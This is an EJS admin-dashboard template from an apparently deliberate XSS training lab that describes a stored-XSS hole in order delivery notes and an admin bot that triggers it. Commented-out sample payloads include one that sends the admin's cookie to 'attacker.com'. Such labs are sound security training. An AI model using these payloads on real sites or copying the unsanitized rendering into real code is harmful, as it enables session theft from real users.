<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - ElectroStore</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <%- include('../partials/header', { user: user, cart: cart }) %>

    <main class="main-content">
        <div class="container">
            <% if (typeof message !== 'undefined' && message) { %>
                <div class="alert alert-info">
                    <i class="fas fa-info-circle"></i> <%= message %>
                </div>
            <% } %>
            
            <% if (typeof error !== 'undefined' && error) { %>
                <div class="alert alert-error">
                    <i class="fas fa-exclamation-triangle"></i> <%= error %>
                </div>
            <% } %>
            
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1><i class="fas fa-user-shield"></i> Admin Dashboard</h1>
                <div>
                    <a href="/products" class="btn btn-secondary">
                        <i class="fas fa-store"></i> Back to Store
                    </a>
                </div>
            </div>

            <div class="card mb-4">
                <div class="card-body">
                    <h3 class="card-title">
                        <i class="fas fa-tachometer-alt"></i> Order Management
                    </h3>
                    <p>Review and manage customer orders. Click on any order to view details.</p>
                    
                    <div class="xss-warning">
                        <h4>
                            <i class="fas fa-exclamation-triangle"></i> SECURITY WARNING
                        </h4>
                        <p>This page contains a <strong>deliberate XSS vulnerability</strong> in the order details view. Delivery notes are rendered without sanitization.</p>
                        <p><strong>Vulnerable code:</strong> <code><%%- order.delivery_notes %></code> in <code>views/admin/order-details.ejs</code></p>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">
                        <i class="fas fa-clipboard-list"></i> All Orders
                    </h3>
                    <div class="admin-actions">
                        <button class="btn btn-sm btn-secondary" onclick="refreshOrders()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                </div>
                
                <div class="card-body">
                    <% if (orders.length === 0) { %>
                        <div class="text-center p-4">
                            <i class="fas fa-clipboard-check fa-3x text-muted mb-3"></i>
                            <h4>No orders yet</h4>
                            <p>When customers place orders, they will appear here.</p>
                        </div>
                    <% } else { %>
                        <div class="table-responsive">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>Order ID</th>
                                        <th>Customer</th>
                                        <th>Items</th>
                                        <th>Total</th>
                                        <th>Status</th>
                                        <th>Date</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <% orders.forEach(order => { %>
                                        <tr>
                                            <td><strong>#<%= order.id %></strong></td>
                                            <td><%= order.customer_name %></td>
                                            <td><%= order.item_count %> items</td>
                                            <td>$<%= order.total_amount ? order.total_amount.toFixed(2) : '0.00' %></td>
                                            <td>
                                                <span class="status-badge status-<%= order.status.toLowerCase() %>">
                                                    <%= order.status %>
                                                </span>
                                            </td>
                                            <td><%= new Date(order.created_at).toLocaleDateString() %></td>
                                            <td>
                                                <div class="d-flex gap-1">
                                                    <a href="/admin/order/<%= order.id %>" class="btn btn-sm btn-primary">
                                                        <i class="fas fa-eye"></i> View
                                                    </a>
                                                    <% if (order.status === 'Created') { %>
                                                        <form action="/admin/order/<%= order.id %>/status" method="POST" style="display: inline;">
                                                            <input type="hidden" name="status" value="Processing">
                                                            <button type="submit" class="btn btn-sm btn-success">
                                                                <i class="fas fa-play"></i> Process
                                                            </button>
                                                        </form>
                                                    <% } else if (order.status === 'Processing') { %>
                                                        <form action="/admin/order/<%= order.id %>/status" method="POST" style="display: inline;">
                                                            <input type="hidden" name="status" value="Shipped">
                                                            <button type="submit" class="btn btn-sm btn-success">
                                                                <i class="fas fa-shipping-fast"></i> Ship
                                                            </button>
                                                        </form>
                                                    <% } %>
                                                </div>
                                            </td>
                                        </tr>
                                    <% }) %>
                                </tbody>
                            </table>
                        </div>
                        
                        <div class="mt-3">
                            <div class="alert alert-info">
                                <i class="fas fa-robot"></i>
                                <strong>Admin Bot:</strong> Automatically views "Created" orders every 60 seconds to trigger any XSS payloads.
                            </div>
                        </div>
                    <% } %>
                </div>
            </div>

            <div class="card mt-4">
                <div class="card-header">
                    <h3 class="card-title">
                        <i class="fas fa-graduation-cap"></i> XSS Lab Instructions
                    </h3>
                </div>
                <div class="card-body">
                    <h4>For Students/Pentesters:</h4>
                    <ol>
                        <li>Create a regular user account and place an order</li>
                        <li>Inject XSS payload in "Delivery Notes" during checkout</li>
                        <li>The admin bot will automatically view your order</li>
                        <li>Your payload executes in the admin context</li>
                        <li>Monitor for successful exploitation (e.g., stolen cookies)</li>
                    </ol>
                    
                    <h4 class="mt-3">Sample XSS Payloads:</h4>
                    <div class="code-samples">
                        <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
                        <!-- <pre><code><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></code></pre>
                        <pre><code><img src=x onerror="alert('XSS')"></code></pre>
                        <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
                    </div>
                    
                    <div class="security-warning mt-3">
                        <i class="fas fa-shield-alt"></i>
                        <strong>Educational Purpose Only:</strong> This vulnerability is intentionally implemented for security training.
                        In production, always sanitize user input and use proper output encoding.
                    </div>
                </div>
            </div>

            <script>
            function refreshOrders() {
                window.location.reload();
            }

            // Auto-refresh every 30 seconds to see new orders
            setTimeout(() => {
                window.location.reload();
            }, 30000);
            </script>
        </div>
    </main>

    <%- include('../partials/footer') %>

    <script src="/js/main.js"></script>
</body>
</html>